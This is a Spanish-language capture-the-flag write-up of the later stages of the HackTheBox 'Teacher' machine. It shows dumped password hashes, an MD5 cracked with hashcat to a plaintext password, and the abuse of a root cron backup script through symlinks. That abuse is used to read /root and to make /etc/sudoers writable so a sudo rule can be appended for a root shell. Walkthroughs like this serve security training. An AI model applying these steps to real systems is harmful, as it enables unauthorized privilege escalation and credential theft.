Traducido y simplificado a otra tabla:

| id   | username    | password                                                        |
|------|-------------|-----------------------------------------------------------------|
| 1    | guest       | \$2y\$10\$ywuE5gDlAlaCu9R0w7pKW.UCB0jUH6ZVKcitP3gMtUNrAebiGMOdO |
| 2    | admin       | \$2y\$10\$7VPsdU9/9y2J4Mynlt6vM.a4coqHRXsNTOq/1aA6wCWTsF2wtrDO2 |
| 3    | giovanni    | \$2y\$10\$38V6kI7LNudORa7lBAT0q.vsQsv4PemY7rf/M1Zkj/i1VqLO0FSYO |
| 1337 | Giovannibak | 7a860966115182402ed06375cf0a22af                                |

Así resulta evidente que tenemos 3 hash de bcrypt y uno de otro tipo:

```text
xbytemx@laptop:~/htb/teacher$ hashid 7a860966115182402ed06375cf0a22af
Analyzing '7a860966115182402ed06375cf0a22af'
[+] MD2
[+] MD5
[+] MD4
[+] Double MD5
[+] LM
[+] RIPEMD-128
[+] Haval-128
[+] Tiger-128
[+] Skein-256(128)
[+] Skein-512(128)
[+] Lotus Notes/Domino 5
[+] Skype
[+] Snefru-128
[+] NTLM
[+] Domain Cached Credentials
[+] Domain Cached Credentials 2
[+] DNSSEC(NSEC3)
[+] RAdmin v2.x
```

Se trata de un MD5, así que `hashcat` a la obra:

```text
xbytemx@laptop:~/htb/teacher$ hashcat -a0 -m0 7a860966115182402ed06375cf0a22af /home/xbytemx/wl/rockyou.txt --force
hashcat (v5.1.0) starting...

...

Dictionary cache hit:
* Filename..: /home/xbytemx/wl/rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

7a860966115182402ed06375cf0a22af:expelled

Session..........: hashcat
Status...........: Cracked
Hash.Type........: MD5
Hash.Target......: 7a860966115182402ed06375cf0a22af
Time.Started.....: Thu Apr  4 22:52:16 2019 (1 sec)
Time.Estimated...: Thu Apr  4 22:52:17 2019 (0 secs)
Guess.Base.......: File (/home/xbytemx/wl/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   929.6 kH/s (12.19ms) @ Accel:32 Loops:1 Thr:64 Vec:1
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 983040/14344384 (6.85%)
Rejected.........: 0/983040 (0.00%)
Restore.Point....: 942080/14344384 (6.57%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: gkloria -> computer?

Started: Thu Apr  4 22:52:09 2019
Stopped: Thu Apr  4 22:52:19 2019
```

Volvamos a ingresar como giovanni:

```text
www-data@teacher:/var/www$ su - giovanni
su - giovanni
Password: expelled

giovanni@teacher:~$
```

> creds: giovanni / expelled

# `cat user.txt`

```text
giovanni@teacher:~$ cat user.txt
cat user.txt
```

# Privesc from giovanni to ***

Veamos el contenido del home de giovanni:

```text
giovanni@teacher:~$ ls -lahR
ls -lahR
.:
total 36K
drwxr-x--- 4 giovanni giovanni 4.0K Nov  4 19:47 .
drwxr-xr-x 3 root     root     4.0K Jun 27  2018 ..
-rw------- 1 giovanni giovanni    1 Nov  4 19:47 .bash_history
-rw-r--r-- 1 giovanni giovanni  220 Jun 27  2018 .bash_logout
-rw-r--r-- 1 giovanni giovanni 3.5K Jun 27  2018 .bashrc
drwxrwxrwx 2 giovanni giovanni 4.0K Jun 27  2018 .nano
-rw-r--r-- 1 giovanni giovanni  675 Jun 27  2018 .profile
-rw-r--r-- 1 giovanni giovanni   33 Jun 27  2018 user.txt
drwxr-xr-x 4 giovanni giovanni 4.0K Jun 27  2018 work

./.nano:
total 8.0K
drwxrwxrwx 2 giovanni giovanni 4.0K Jun 27  2018 .
drwxr-x--- 4 giovanni giovanni 4.0K Nov  4 19:47 ..

./work:
total 16K
drwxr-xr-x 4 giovanni giovanni 4.0K Jun 27  2018 .
drwxr-x--- 4 giovanni giovanni 4.0K Nov  4 19:47 ..
drwxr-xr-x 3 giovanni giovanni 4.0K Jun 27  2018 courses
drwxr-xr-x 3 giovanni giovanni 4.0K Jun 27  2018 tmp

./work/courses:
total 12K
drwxr-xr-x 3 giovanni giovanni 4.0K Jun 27  2018 .
drwxr-xr-x 4 giovanni giovanni 4.0K Jun 27  2018 ..
drwxr-xr-x 2 root     root     4.0K Jun 27  2018 algebra

./work/courses/algebra:
total 12K
drwxr-xr-x 2 root     root     4.0K Jun 27  2018 .
drwxr-xr-x 3 giovanni giovanni 4.0K Jun 27  2018 ..
-rw-r--r-- 1 giovanni giovanni  109 Jun 27  2018 answersAlgebra

./work/tmp:
total 16K
drwxr-xr-x 3 giovanni giovanni 4.0K Jun 27  2018 .
drwxr-xr-x 4 giovanni giovanni 4.0K Jun 27  2018 ..
-rwxrwxrwx 1 root     root      256 Apr  5 06:59 backup_courses.tar.gz
drwxrwxrwx 3 root     root     4.0K Jun 27  2018 courses

./work/tmp/courses:
total 12K
drwxrwxrwx 3 root     root     4.0K Jun 27  2018 .
drwxr-xr-x 3 giovanni giovanni 4.0K Jun 27  2018 ..
drwxrwxrwx 2 root     root     4.0K Jun 27  2018 algebra

./work/tmp/courses/algebra:
total 12K
drwxrwxrwx 2 root     root     4.0K Jun 27  2018 .
drwxrwxrwx 3 root     root     4.0K Jun 27  2018 ..
-rwxrwxrwx 1 giovanni giovanni  109 Jun 27  2018 answersAlgebra
```

Nos llama la atención el archivo `backup_courses.tar.gz` y que la carpeta tmp tiene una copia de courses. Revisando los procesos no encontramos nada asociado.

Tras ver que el archivo `backup_courses.tar.gz` cambiaba con el tiempo, esto fue una clara señal de un malevolo cronjob, por lo que lance `pspy`:


```text
giovanni@teacher:~$ /var/www/moodledata/.tmp/pspy64
/var/www/moodledata/.tmp/pspy64
Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)

......

2019/04/05 07:05:01 CMD: UID=0    PID=11031  | /usr/sbin/CRON -f
2019/04/05 07:05:01 CMD: UID=0    PID=11032  | /usr/sbin/CRON -f
2019/04/05 07:05:01 CMD: UID=0    PID=11033  | /bin/bash /usr/bin/backup.sh
2019/04/05 07:05:01 CMD: UID=0    PID=11034  | /bin/bash /usr/bin/backup.sh
2019/04/05 07:05:01 CMD: UID=0    PID=11035  | tar -czvf tmp/backup_courses.tar.gz courses/algebra
2019/04/05 07:05:01 CMD: UID=0    PID=11036  | /bin/sh -c gzip
2019/04/05 07:05:01 CMD: UID=0    PID=11037  | /bin/bash /usr/bin/backup.sh
2019/04/05 07:05:01 CMD: UID=0    PID=11038  | tar -xf backup_courses.tar.gz
2019/04/05 07:05:01 CMD: UID=0    PID=11039  | /bin/bash /usr/bin/backup.sh
```

Ahora sabemos que existe un cronjob de root que ejecuta `/usr/bin/backup.sh`, por lo que veamos en su contenido:

```text
giovanni@teacher:~$ cat /usr/bin/backup.sh
#!/bin/bash
cd /home/giovanni/work;
tar -czvf tmp/backup_courses.tar.gz courses/*;
cd tmp;
tar -xf backup_courses.tar.gz;
chmod 777 * -R;
```

Básicamente tmp es una copia de los cursos en work.

Esto se ejecuta como **root** sobre archivos que son de **giovanni**:

INPUT

```text
./work:
drwxr-xr-x 3 giovanni giovanni 4.0K Jun 27  2018 courses
```

Esto es importante de señalar porque el script de backup confía en que el origen del que es dueño giovanni siempre sera el mismo, mas aun agrega un wildcard '*' donde incluye todo. Adicionalmente que root tiene muchísimos menos restricciones a la hora de acceder a otros archivos, a los que el usuario si el usuario giovanni ejecutara el backup.sh no le permitiría.

Hay un [articulo](https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/) muy interesante sobre los privesc sobre los wildcards.

En este caso, abusaremos que podemos crear enlaces simbolicos y realizaremos un backup pero de `/root`:

```text
giovanni@teacher:~$ cd work
cd work
giovanni@teacher:~/work$ ls
ls
courses  tmp
giovanni@teacher:~/work$ mv courses courses.old
mv courses courses.old
giovanni@teacher:~/work$ ln -s /root/ courses
ln -s /root/ courses
giovanni@teacher:~/work$ ls -lah
ls -lah
total 16K
drwxr-xr-x 4 giovanni giovanni 4.0K Apr  5 07:53 .
drwxr-x--- 4 giovanni giovanni 4.0K Nov  4 19:47 ..
lrwxrwxrwx 1 giovanni giovanni    6 Apr  5 07:53 courses -> /root/
drwxr-xr-x 3 giovanni giovanni 4.0K Jun 27  2018 courses.old
drwxr-xr-x 3 giovanni giovanni 4.0K Jun 27  2018 tmp
giovanni@teacher:~/work$ cd tmp
cd tmp
giovanni@teacher:~/work/tmp$ ls
ls
backup_courses.tar.gz  courses
giovanni@teacher:~/work/tmp$ ls -lah
ls -lah
total 16K
drwxr-xr-x 3 giovanni giovanni 4.0K Jun 27  2018 .
drwxr-xr-x 4 giovanni giovanni 4.0K Apr  5 07:53 ..
-rwxrwxrwx 1 root     root      150 Apr  5 07:54 backup_courses.tar.gz
drwxrwxrwx 3 root     root     4.0K Apr  5 07:54 courses
giovanni@teacher:~/work/tmp$ date
date
Fri Apr  5 07:54:28 CEST 2019
giovanni@teacher:~/work/tmp$ base64 backup_courses.tar.gz
base64 backup_courses.tar.gz
H4sIAHntplwAA+3QOw7CMBCEYdecIieA9XPNcewotJFiR+L4PEqCoIoQ0v81U+wUox3ndWlTOy3z
3I/92s0O5C6JPFO2KRKssd7bEFNS9Uas0xTNIHuMebW2XpZhMI8HfOp9u/+pcPEl+xpcGVWdL1Fy
zWWctOZqnZwPvx4IAAAAAAAAAAAAAAAAAHjrBoMCTGsAKAAA
giovanni@teacher:~/work/tmp$ cd ..
cd ..
giovanni@teacher:~/work$ ls
ls
courses  courses.old  tmp
giovanni@teacher:~/work$ rm courses && mv courses.old courses
rm courses && mv courses.old courses
giovanni@teacher:~/work$
```

Ahora que tenemos el b64 del backup de root solo es crear el archivo y descomprimir:

```text
xbytemx@laptop:~/htb/teacher$ cat backup_courses.tar.gz.b64
H4sIAHntplwAA+3QOw7CMBCEYdecIieA9XPNcewotJFiR+L4PEqCoIoQ0v81U+wUox3ndWlTOy3z
3I/92s0O5C6JPFO2KRKssd7bEFNS9Uas0xTNIHuMebW2XpZhMI8HfOp9u/+pcPEl+xpcGVWdL1Fy
zWWctOZqnZwPvx4IAAAAAAAAAAAAAAAAAHjrBoMCTGsAKAAA
xbytemx@laptop:~/htb/teacher$ base64 -d backup_courses.tar.gz.b64 > backup_courses.tar.gz
xbytemx@laptop:~/htb/teacher$ tar xfz backup_courses.tar.gz
xbytemx@laptop:~/htb/teacher$ ls -lah courses/
total 12K
drwxr-xr-x 2 xbytemx xbytemx 4.0K abr  4 23:56 .
drwxr-xr-x 4 xbytemx xbytemx 4.0K abr 27 20:38 ..
-rw------- 1 xbytemx xbytemx   33 jun 26  2018 root.txt
```

# `cat root.txt`

```text
xbytemx@laptop:~/htb/teacher$ cat courses/root.txt
```

... We got root flag.

Pero aun nos falta la shell!

# Abusing backup script again.

```text
giovanni@teacher:~$ cat /usr/bin/backup.sh
#!/bin/bash
cd /home/giovanni/work;
tar -czvf tmp/backup_courses.tar.gz courses/*;
cd tmp;
tar -xf backup_courses.tar.gz;
chmod 777 * -R;
```

Como sabemos, el script de backup tiene dos partes una donde comprime y otra donde extrae, pero algo muy interesante sucede al final; agrega todos los permisos a todo de manera recursiva. Wildcard strikes again.

Ahora, como los comandos no están concatenados ni evalúan la salida exitosa, ¿que pasaría si en lugar de que el enlace simbólico fuera courses, fuera algún archivo dentro de tmp? Pues básicamente estaríamos asignando un 777 a ese archivo. El archivo podría ser sudoers por ejemplo, permitiendo que giovanni haga sudo:

```text
giovanni@teacher:~/work$ mv tmp tmp.old
mv tmp tmp.old
giovanni@teacher:~/work$ ln -s /etc/sudoers tmp
ln -s /etc/sudoers tmp
giovanni@teacher:~/work$ ls -lah
ls -lah
total 16K
drwxr-xr-x 4 giovanni giovanni 4.0K Apr  5 07:53 .
drwxr-x--- 4 giovanni giovanni 4.0K Nov  4 19:47 ..
lrwxrwxrwx 1 giovanni giovanni    6 Apr  5 07:53 tmp -> /etc/sudoers
drwxr-xr-x 3 giovanni giovanni 4.0K Jun 27  2018 courses
drwxr-xr-x 3 giovanni giovanni 4.0K Jun 27  2018 tmp.old
giovanni@teacher:~/work$ sleep 60 && printf "giovanni   ALL=(ALL:ALL) ALL" >> /etc/sudoers
printf "giovanni   ALL=(ALL:ALL) ALL" >> /etc/sudoers
giovanni@teacher:~/work$ rm tmp && mv tmp.old tmp
rm tmp && mv tmp.old tmp
giovanni@teacher:~/work$ sudo -s
sudo -s

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for giovanni: expelled
root@teacher:/home/giovanni/work# id
id
uid=0(root) gid=0(root) grupos=0(root)
```

---

Gracias por llegar hasta aquí, hasta la próxima!
